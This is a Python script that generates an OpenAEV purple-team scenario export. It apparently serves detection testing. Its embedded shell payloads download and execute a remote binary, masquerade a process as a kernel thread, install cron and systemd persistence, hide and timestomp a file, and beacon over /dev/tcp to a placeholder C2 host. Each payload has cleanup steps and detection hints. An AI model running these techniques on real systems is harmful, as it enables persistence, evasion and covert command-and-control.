import json, uuid, copy, zipfile, os, sys

# Template: a real OpenAEV/OpenBAS scenario export JSON from YOUR instance (so the
# envelope, injector-contract scaffolding, domain id and implant injector ids match
# exactly). Pass its path as argv[1]; it is read as a template only — none of its
# scenario content is copied into the output (injects + info are fully replaced).
SRC = sys.argv[1] if len(sys.argv) > 1 else "template-export.json"
OUTDIR = "/home/ssantiagocv/wetland/sim"
JSON_NAME = "[wetland] purple-team C2 lab.json"
NS = uuid.UUID("a1b2c3d4-0000-0000-0000-000000000000")
def U(k): return str(uuid.uuid5(NS, "wetland-oaev:"+k))

base = json.load(open(SRC))
TMPL_INJECT = copy.deepcopy(base["scenario_injects"][0])   # real openaev_implant Command inject

def ap(ext, name):
    return {"attack_pattern_id": U("ap:"+ext), "attack_pattern_name": name,
            "attack_pattern_description": "MITRE ATT&CK technique exercised by the wetland purple-team lab.",
            "attack_pattern_external_id": ext, "attack_pattern_kill_chain_phases": []}

def make_inject(key, title, desc, label, executor, content,
                cleanup_executor, cleanup, aps, delay):
    j = copy.deepcopy(TMPL_INJECT)
    j["inject_id"] = U("inject:"+key)
    j["inject_title"] = title
    j["inject_description"] = desc
    j["inject_country"] = ""
    j["inject_city"] = ""
    j["inject_enabled"] = True
    j["inject_all_teams"] = False
    j["inject_teams"] = []
    j["inject_tags"] = []
    j["inject_documents"] = []
    j["inject_depends_on"] = []
    j["inject_depends_duration"] = delay
    # inject_content kept from the real template (obfuscator + DETECTION expectation + threatops overrides)

    ic = j["inject_injector_contract"]
    cid = U("contract:"+key)
    ic["injector_contract_id"] = cid
    ic["injector_contract_external_id"] = U("cext:"+key)
    ic["injector_contract_labels"] = {"en": label, "fr": label}
    ic["injector_contract_platforms"] = ["Linux"]
    ic["injector_contract_attack_patterns"] = aps
    ic["injector_contract_tags"] = []
    ic["injector_contract_vulnerabilities"] = []
    ic["injector_contract_injector_type"] = "openaev_implant"
    ic["injector_contract_payload_status"] = "VERIFIED"
    # keep verbatim from template: listened, injector_contract_injectors,
    # injector_contract_injector_names, injector_contract_domains, created/updated,
    # custom, import_available, atomic_testing, arch, manual, needs_executor

    cc = ic["convertedContent"]
    cc["contract_id"] = cid
    cc["label"] = {"en": label, "fr": label}
    cc["platforms"] = ["Linux"]
    cc["contract_attack_patterns_external_ids"] = []   # mapping carried by injector_contract_attack_patterns (as in the source export)
    ic["injector_contract_content"] = json.dumps(cc, separators=(",", ":"), ensure_ascii=False)

    p = ic["injector_contract_payload"]
    p["payload_id"] = U("pid:"+key)
    p["payload_external_id"] = U("pext:"+key)
    p["payload_type"] = "Command"
    p["payload_name"] = "wetland — " + label
    p["payload_description"] = desc
    p["payload_platforms"] = ["Linux"]
    p["command_executor"] = executor
    p["command_content"] = content
    p["payload_cleanup_executor"] = cleanup_executor
    p["payload_cleanup_command"] = cleanup
    p["payload_elevation_required"] = False
    p["payload_arguments"] = []
    p["payload_prerequisites"] = []
    p["payload_source"] = "MANUAL"
    p["payload_status"] = "VERIFIED"
    p["payload_collector_type"] = None
    p["payload_detection_remediations"] = []
    p["payload_output_parsers"] = []
    p["payload_expectations"] = ["DETECTION"]
    # keep verbatim: listened, payload_execution_arch, payload_created_at/updated_at
    return j

injects = []

# 0. Ingress tool transfer (T1105) — pull the wld tool-under-test onto the host (FIRST)
injects.append(make_inject("ingress",
 "Ingress Tool Transfer — pull the wld tool onto the host (T1105)",
 "First step of the chain: fetch the tool-under-test. curl downloads the wld binary from the "
 "project's GitHub and runs `wld -h` (benign — prints usage) to prove download+execute, then "
 "cleanup removes it. Detection: curl writing an executable to disk and a new process spawning "
 "from it (proxy/NDR tool transfer; EDR exec-after-download).",
 "Ingress tool transfer (wld)", "bash",
 "# WETLAND-LAB  T1105 ingress tool transfer — pull the wld tool-under-test\n"
 "url='https://raw.githubusercontent.com/s4nntysec/wetland/main/dist/release/wld-linux-x86_64'\n"
 "# (swap to a Release once published: .../releases/latest/download/wld-linux-x86_64)\n"
 "dst=\"$HOME/.wetland-lab-wld\"\n"
 "if curl -fsSL -o \"$dst\" \"$url\"; then\n"
 "  chmod +x \"$dst\"\n"
 "  echo \"WETLAND-LAB ingress: downloaded wld -> $dst (T1105)\"\n"
 "  \"$dst\" -h 2>&1 | head -n 2\n"
 "else\n"
 "  echo 'WETLAND-LAB ingress: download blocked (proxy/AV) — that is a valid detection'\n"
 "fi\n"
 "echo 'detect: curl writing an executable to disk then executing it; proxy/NDR tool transfer'\n",
 "bash",
 "rm -f \"$HOME/.wetland-lab-wld\"\n"
 "echo 'WETLAND-LAB ingress: cleaned'\n",
 [ap("T1105","Ingress Tool Transfer")], 0))

injects.append(make_inject("masquerade",
 "Masquerade — process named as a kernel thread (T1036)",
 "Purple-team sim of `wld -l -M '[kworker/0:0]'` / `wld lab masquerade`: launches a real "
 "process whose argv[0] is faked to look like a kernel worker thread, holds it ~30s, then "
 "cleans up. Detection: a process whose comm looks like a kthread but /proc/<pid>/exe is a real file.",
 "Masquerade (kworker)", "bash",
 "# WETLAND-LAB  T1036.005 masquerade (process name)\n"
 "drop=/tmp/.wetland-lab-kworker\n"
 "cp \"$(command -v sleep)\" \"$drop\" && chmod +x \"$drop\"\n"
 "( exec -a '[kworker/0:0]' \"$drop\" 30 ) >/dev/null 2>&1 </dev/null &\n"
 "echo \"WETLAND-LAB masquerade: pid $! runs $drop presenting as [kworker/0:0] for 30s\"\n"
 "echo \"detect: comm looks like a kthread but /proc/<pid>/exe resolves to $drop\"\n",
 "bash",
 "pkill -f '^\\[kworker/0:0\\]' 2>/dev/null || true\n"
 "rm -f /tmp/.wetland-lab-kworker\n"
 "echo 'WETLAND-LAB masquerade: cleaned'\n",
 [ap("T1036.005","Match Legitimate Name or Location"),
  ap("T1036.004","Masquerade Task or Service")], 60))

injects.append(make_inject("persist_cron",
 "Persistence — @reboot cron entry (T1053.003)",
 "Mirrors `wld lab persist --method cron`: installs a @reboot crontab line tagged WETLAND-LAB "
 "(harmless heartbeat), removed on cleanup. Detection: `crontab -l | grep WETLAND-LAB`.",
 "Persistence (cron @reboot)", "sh",
 "# WETLAND-LAB  T1053.003 cron persistence\n"
 "line='@reboot /bin/sh -c \"echo WETLAND-LAB heartbeat >> $HOME/.wetland-lab.log\" # WETLAND-LAB'\n"
 "( crontab -l 2>/dev/null | grep -v 'WETLAND-LAB'; echo \"$line\" ) | crontab - \\\n"
 "  && echo 'WETLAND-LAB persist[cron]: installed @reboot heartbeat' \\\n"
 "  || echo 'WETLAND-LAB persist[cron]: no cron spool/daemon (line still intended)'\n"
 "echo 'detect: crontab -l | grep WETLAND-LAB'\n",
 "sh",
 "crontab -l 2>/dev/null | grep -v 'WETLAND-LAB' | crontab - 2>/dev/null || true\n"
 "echo 'WETLAND-LAB persist[cron]: cleaned'\n",
 [ap("T1053.003","Cron")], 120))

injects.append(make_inject("persist_systemd",
 "Persistence — systemd --user service (T1543.002)",
 "Mirrors `wld lab persist --method systemd`: writes and enables a systemd --user unit tagged "
 "WETLAND-LAB (best-effort if no user systemd session). Cleanup disables and removes it. "
 "Detection: `systemctl --user list-unit-files | grep wetland-lab`.",
 "Persistence (systemd --user)", "bash",
 "# WETLAND-LAB  T1543.002 systemd --user persistence\n"
 "d=\"$HOME/.config/systemd/user\"; mkdir -p \"$d\"\n"
 "cat > \"$d/wetland-lab.service\" <<'UNIT'\n"
 "[Unit]\n"
 "Description=WETLAND-LAB purple-team persistence simulation (T1543.002)\n"
 "[Service]\n"
 "Type=oneshot\n"
 "ExecStart=/bin/sh -c 'echo WETLAND-LAB heartbeat >> %h/.wetland-lab.log'\n"
 "[Install]\n"
 "WantedBy=default.target\n"
 "UNIT\n"
 "if systemctl --user daemon-reload 2>/dev/null && systemctl --user enable wetland-lab.service 2>/dev/null; then\n"
 "  echo 'WETLAND-LAB persist[systemd]: unit enabled'\n"
 "else\n"
 "  echo \"WETLAND-LAB persist[systemd]: unit written at $d/wetland-lab.service (no user systemd session to enable)\"\n"
 "fi\n",
 "bash",
 "systemctl --user disable wetland-lab.service 2>/dev/null || true\n"
 "rm -f \"$HOME/.config/systemd/user/wetland-lab.service\"\n"
 "systemctl --user daemon-reload 2>/dev/null || true\n"
 "echo 'WETLAND-LAB persist[systemd]: cleaned'\n",
 [ap("T1543.002","Systemd Service")], 180))

injects.append(make_inject("hide",
 "Defense Evasion — hidden file + timestomp (T1564.001 / T1070.006)",
 "Mirrors `wld lab hide`: drops an executable dot-file in $HOME and copies mtime/atime from a "
 "system binary (ctime cannot be faked). Cleanup removes it. Detection: "
 "`find ~ -maxdepth 1 -name '.*' -type f -perm -u+x`; ctime >> mtime.",
 "Hidden file + timestomp", "bash",
 "# WETLAND-LAB  T1564.001 hidden file + T1070.006 timestomp\n"
 "dst=\"$HOME/.wetland-lab\"\n"
 "cp \"$(command -v ls)\" \"$dst\" && chmod +x \"$dst\"\n"
 "touch -r /bin/ls \"$dst\"\n"
 "echo \"WETLAND-LAB hide: dropped $dst, timestomped mtime/atime from /bin/ls\"\n"
 "echo \"detect: find ~ -maxdepth 1 -name '.*' -type f -perm -u+x ; ctime >> mtime\"\n",
 "bash",
 "rm -f \"$HOME/.wetland-lab\"\n"
 "echo 'WETLAND-LAB hide: cleaned'\n",
 [ap("T1564.001","Hidden Files and Directories"),
  ap("T1070.006","Timestomp")], 240))

injects.append(make_inject("beacon",
 "Command & Control — HTTP-shaped C2 beacon (T1071.001 / T1571)",
 "Mirrors `wld lab beacon --as http`: five jittered outbound check-ins shaped as HTTP GET with a "
 "fixed browser User-Agent. EDIT the C2= line to your wetland relay/tunnel host:port. Detection: "
 "beaconing regularity, fixed UA, low bytes-up/down ratio (NetFlow/Zeek).",
 "C2 beacon (http-shaped)", "bash",
 "# WETLAND-LAB  T1071.001 / T1571 C2 beacon (http-shaped)\n"
 "C2='example.com:443'   # <-- EDIT: your wetland relay/tunnel host:port\n"
 "host=\"${C2%%:*}\"; port=\"${C2##*:}\"; [ \"$host\" = \"$port\" ] && port=443\n"
 "i=1\n"
 "while [ $i -le 5 ]; do\n"
 "  if exec 3<>\"/dev/tcp/$host/$port\" 2>/dev/null; then\n"
 "    printf 'GET /%08x HTTP/1.1\\r\\nHost: %s\\r\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\\r\\nAccept: */*\\r\\n\\r\\n' \"$RANDOM\" \"$host\" >&3\n"
 "    head -c 64 <&3 >/dev/null 2>&1; exec 3>&- 2>/dev/null\n"
 "    echo \"WETLAND-LAB beacon #$i: check-in to $host:$port (http-shaped)\"\n"
 "  else\n"
 "    echo \"WETLAND-LAB beacon #$i: $host:$port unreachable\"\n"
 "  fi\n"
 "  i=$((i+1)); sleep $(( (RANDOM % 7) + 3 ))\n"
 "done\n"
 "echo 'detect: periodic outbound to one host; fixed UA; low bytes-up/down (NetFlow/Zeek)'\n",
 None, None,
 [ap("T1071.001","Web Protocols"),
  ap("T1571","Non-Standard Port")], 300))

# ---- envelope: keep the real export's shape, swap info + injects, empty instance data ----
out = copy.deepcopy(base)
si = out["scenario_information"]
si["scenario_id"] = U("scenario")
si["scenario_name"] = "[wetland] purple-team C2 lab"
si["scenario_subtitle"] = ""
si["scenario_description"] = (
 "Purple-team breach-and-attack-simulation of the wetland lab TTPs "
 "(github.com/s4nntysec/wetland). Each inject reproduces one `wld lab` technique as a portable, "
 "self-cleaning shell payload (no wld binary required on the agent), tagged WETLAND-LAB and mapped "
 "to ATT&CK: process masquerade (T1036), cron + systemd persistence (T1053.003 / T1543.002), hidden "
 "file + timestomp (T1564.001 / T1070.006) and an HTTP-shaped C2 beacon (T1071.001 / T1571). The "
 "techniques are intentionally loud and reversible — the goal is detectable telemetry. Target your "
 "Linux assets, run, then review prevention/detection. Edit the beacon's C2= line to your wetland "
 "relay/tunnel.")
si["scenario_category"] = "attack-scenario"
si["scenario_main_focus"] = "endpoint-protection"
si["scenario_severity"] = "high"
si["scenario_tags"] = []
si["scenario_documents"] = []
si["scenario_dependencies"] = None

out["scenario_injects"] = injects
for k in ("scenario_teams","scenario_users","scenario_organizations","scenario_tags",
          "scenario_documents","scenario_channels","scenario_articles","scenario_challenges",
          "scenario_lessons_categories","scenario_lessons_questions","scenario_variables"):
    if isinstance(out.get(k), list): out[k] = []
# scenario_objectives stays as in the source (None)
out["export_version"] = 1

os.makedirs(OUTDIR, exist_ok=True)
json_path = os.path.join(OUTDIR, "wetland-purple-c2.openaev.json")
zip_path  = os.path.join(OUTDIR, "wetland-purple-c2.openaev.zip")
blob = json.dumps(out, indent=1, ensure_ascii=False)
open(json_path, "w", encoding="utf-8").write(blob)

zi = zipfile.ZipInfo(JSON_NAME)
zi.compress_type = zipfile.ZIP_DEFLATED
zi.comment = b"Scenario"
zi.external_attr = 0o644 << 16
with zipfile.ZipFile(zip_path, "w") as z:
    z.writestr(zi, blob.encode("utf-8"))

print("wrote", json_path, os.path.getsize(json_path))
print("wrote", zip_path, os.path.getsize(zip_path))
